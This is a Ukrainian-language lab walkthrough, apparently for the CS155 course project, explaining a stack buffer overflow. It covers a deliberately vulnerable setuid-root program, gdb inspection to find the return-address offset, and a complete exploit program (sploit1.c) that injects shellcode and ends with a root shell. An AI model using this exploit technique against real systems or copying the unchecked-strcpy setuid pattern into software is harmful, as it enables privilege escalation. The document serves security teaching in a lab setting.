# Buffer overflow

Розглянемо /proj1/targets/target1.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int bar(char *arg, char *out)
{
  strcpy(out, arg); //Копіює з пам'яті arg в пам'ять, поки arg
                                    //не буде 0x00
  return 0;
}
 
void foo(char *argv[])
{
  char buf[256]; //Виділяє буфер в пам’яті, що вміщує 256 байт
  bar(argv[1], buf); //Функція панелі викликів, де першим
  //аргументом командного рядка є вихідна пам'ять для
  //копіювання, а buf - цільова пам'ять для копіювання
}
int main(int argc, char *argv[])
{
  //Перевірка, чи є у нас рівно два аргумента командного
  //рядка (наприклад [0]-./target1 завжди зарезервовано для
  //ім'я виконуваного файлу, [1]-ABCD), інакше надрукуйте
  //повідомлення про помилку та вийдіть із програми
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```

_‌Лістинг 1: Вихідний код нашої програми target1 для використання переповнення буфера._

Уразливістю в цій програмі є використання strcpy, який копіює перші аргументи командного рядка в буфер обмеженої довжини \(256 байт\) без перевірки довжини вхідного буфера \(тобто аргументу командного рядка\). Це може використати для виконання атаки переповнення буфера, надавши аргумент командного рядка, який перевищує 256 байт.

Зкопілюмо на відкриємо target1 в gdb \(GNU Debugger\):

```bash
user@vm-cs155:~$ cd proj1/targets/
user@vm-cs155:~/proj1/targets$ make
execstack -s target1 target2 target3 target4 target5 target6 extra-credit
user@vm-cs155:~/proj1/targets$ sudo make install
[sudo] password for user: #cs155
execstack -s target1 target2 target3 target4 target5 target6 extra-credit
install -o root -t /tmp target1 target2 target3 target4 target5 target6 extra-credit
chmod 4755 /tmp/target*
user@vm-cs155:~/proj1/targets$ gdb target1
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
...
```

_Лістинг 2: відкриття gdb_

Оскільки вихідний код доступний, gdb дозволяє ефективніше перевіряти джерело під час налагодження та встановлювати точки зупинки. Подвивимось функцію foo:

```bash
(gdb) list foo
8     strcpy(out, arg);
9     return 0;
10  }
11  
12  void foo(char *argv[])
13  {
14    char buf[256];
15    bar(argv[1], buf);
16  }
17
```

_Лістинг 3: лістинг функції foo в gdb_

Нас цікавить вміст пам'яті буфера buf після того, як він був заповнений strcpy. Давайте перервемося на рядок 16, безпосередньо після повернення дзвінка на bar і до повернення foo до main:

```text
(gdb) break 16
Breakpoint 1 at 0x8048504: file target1.c, line 16.
```

_Лістинг 4: breakpoints в gdb_

Запустимо та дочекаємось першої зупинки:

```bash
(gdb) r AAAA
Starting program: /home/user/proj1/targets/target1 AAAA

Breakpoint 1, foo (argv=0xbffff6c4) at target1.c:16
16  }
```

_Лістинг 5: breakpoint 1 в gdb_

Тепер давайте перевіримо вміст buf. Тут ми друкуємо перші 4 слова \(w\) буфера в шістнадцятковій формі \(x\):

```bash
(gdb) x /128bx buf
0xbffff51c: 0x41    0x41    0x41    0x41    0x00    0x79    0xff    0xb7
0xbffff524: 0xd0    0xf5    0xff    0xbf    0x1f    0x58    0xff    0xb7
0xbffff52c: 0x18    0x7b    0xfd    0xb7    0x00    0x00    0x00    0x00
0xbffff534: 0x00    0xf0    0xff    0xb7    0x18    0xf9    0xff    0xb7
0xbffff53c: 0x54    0xf5    0xff    0xbf    0x7a    0x82    0x04    0x08
0xbffff544: 0x00    0x00    0x00    0x00    0xe8    0xf5    0xff    0xbf
0xbffff54c: 0xdc    0xf5    0xff    0xbf    0xc9    0x3e    0xfe    0xb7
0xbffff554: 0xff    0xff    0xff    0xff    0xd0    0xfa    0xff    0xb7
0xbffff55c: 0x98    0xd0    0xe1    0xb7    0x58    0x78    0xfd    0xb7
0xbffff564: 0x4b    0x4a    0xfe    0xb7    0x20    0x82    0x04    0x08
0xbffff56c: 0xd8    0xf5    0xff    0xbf    0x74    0xfa    0xff    0xb7
0xbffff574: 0x01    0x00    0x00    0x00    0x48    0x7b    0xfd    0xb7
0xbffff57c: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbffff584: 0x01    0x00    0x00    0x00    0x18    0xf9    0xff    0xb7
0xbffff58c: 0xff    0xb5    0xf0    0x00    0xce    0xf5    0xff    0xbf
0xbffff594: 0x70    0x49    0xfe    0xb7    0x30    0x82    0x04    0x08
(gdb) x /wx buf
0xbffff51c: 0x41414141
```

_Лістинг 6: вміст buf в gdb_

Ми бачимо, що перше слово пам’яті було перезаписано в рядку. Ви можете перевірити код ASCII для подання AAAA у шістнадцятковій формі і помітите, що A дорівнює 0x41. Отже, очевидно, що перше слово buf справді дорівнює AAAA.

Слова представлені у зворотному порядку байтів \("маленький ендіан"\), тобто нижня адреса пам'яті знаходиться в кінці. Таким чином, А стоїть у кінці першого слова. Мало-ендіанське впорядкування відображається, якщо ми друкуємо слова \(4 байти в 32-бітовій системі\) замість одинарних байтів.

Далі перевіримо адресу пам'яті buf:

```bash
(gdb) print & buf
$1 = (char (*)[256]) 0xbffff51c
```

_Лістинг 7: вміст buf в gdb_

Використовуючи "&" означає, нас цікавить адреса пам'яті змінної, а не її вміст. Це означає, що buf знаходиться за адресою **0xbffff51c** і займає наступні 256 байт, починаючи з цієї адреси. Для друку його вмісту ми можемо використовувати команду x, як показано раніше. На даний момент, поки виконання target1 зупиняється в кінці функції foo, ми також можемо дослідити, яка адреса повернення збережена в стеці. Для цього ми збираємо інформацію про поточний фрейм стека:

```bash
(gdb) info frame
Stack level 0, frame at 0xbffff624:
 eip = 0x8048504 in foo (target1.c:16); saved eip = 0x8048540
 called by frame at 0xbffff630
 source language c.
 Arglist at 0xbffff61c, args: argv=0xbffff6c4
 Locals at 0xbffff61c, Previous frame's sp is 0xbffff624
 Saved registers:
  ebp at 0xbffff61c, eip at 0xbffff620
```

_Лістинг 8: вміст поточного фрейма в gdb_

Важливою є інформація про збережені регістри, де eip - вказівник інструкції, тобто адреса пам'яті наступної команди, яку потрібно виконати. Це означає, що після повернення foo покажчик інструкцій буде відновлений до значення, збереженого за адресою пам'яті збереженого eip \(тобто, в розташуванні пам'яті **0xbffff620**\).

Тепер, коли ми знаємо, до якого значення ми повинні встановити збережений вказівник інструкції, ми повинні створити код експлоїту, який буде передаватися як перший аргумент програмі \(тобто як argv \[1\]\). Щоб переповнити buf і згодом збережений eip, ми повинні знати, скільки часу повинен бути наш вхід. У цьому випадку ми можемо обчислити цю довжину з відстані між початком buf та адресою збереженого eip. З попереднього розділу 1 ми знаємо, що buf знаходиться за адресою **0xbffff51c**, а збережений eip у функції foo знаходиться за адресою **0xbffff620**. Таким чином, відстань між початком буфера та збереженою адресою повернення становить:

**Offset = 0xbffff620 - 0xbffff51c = 0x104 = 260 байт**

Шеллкод нам треба буде запровадити в пам'ять нашої вразливою програми, після чого нам треба буде передати управління на шеллкод при переповненні буфера. Передача управління шеллкоду здійснюється перезаписом адреси повернення \(RET\) в стеку, адресою впровадженого шеллкода. Але може не вистачить місця для розміщення шеллкода. Можна виділити більше місця для цього додамо ще якусь кількість байтів за межами RET. Сбробуємо запустити з "A" \* 1000 символами:

```bash
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/proj1/targets/target1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

_Лістинг 9: запуск з переповненням буферу в gdb_

Та подивимося регістри ESP щоб вибрати місце куди класти шелкод. Для цього я вибрав адресу:

```bash
(gdb) x/400x $esp
...
0xbffffd10:    0x41414141  0x41414141  0x41414141  0x41414141
...
```

При написанні sploit1 спочатку треба заповнити сміттям так щоб після RET було місце на shellcode. Наприклад 450-strlen\(shellcode\). Далі кладемо сам shellcode. Та посимвольно добавити адрессу возврату на функцію \(eip\). Нашу программу можно представити так:

```text
           | |
           | | [Мусар 0x41]  
           | |
0xbffffd10 -X-[shellcode] <----------------------------\
           | |                                          |
           | | [Мусар 0x41]                             |
           | |                                          |
0xbffff620 -X- Адреса возврату на функцію (eip)--------/
           | |        
  260 байт | | [Мусар 0x41]
           | |  
0xbffff51c -X-  адреса buf у пам'яті
```

Напишем сам код для sploit1.c

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  long RET; //Щоб зберігати адресу RET
  int i; //Для запуску циклу додавання адреси на наш шеллкод
  char buf[1000];
  char *p; //Це покажчик на наш буфер даних
  RET = 0xbffffd10;
  p = buf; //Вказуємо на те, що вона тепер стаємо покажчиком на наш буфер.

  memset(buf, 0x41, 450-strlen(shellcode)); //Заповнюємо наш буфер "сміттям" 
  sprintf(buf+450-strlen(shellcode), "%s", shellcode); //Кладемо шелкод

  //У циклі ми додаємо адресу з "країв" на 4 байта вперед для того, щоб адреса помістився повністю.
  for ( i = 260; i <= 264; i+= 4 )
  *(long*)(p+i) = RET;

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

_Лістинг 10: sploit1.c_

Скомпілюємо і запустимо sploit1:

```bash
user@vm-cs155:~/proj1/sploits$ ./sploit1
# whoami #перевіримо користувача
root
```

Лістинг 11: запуск sploit1\*

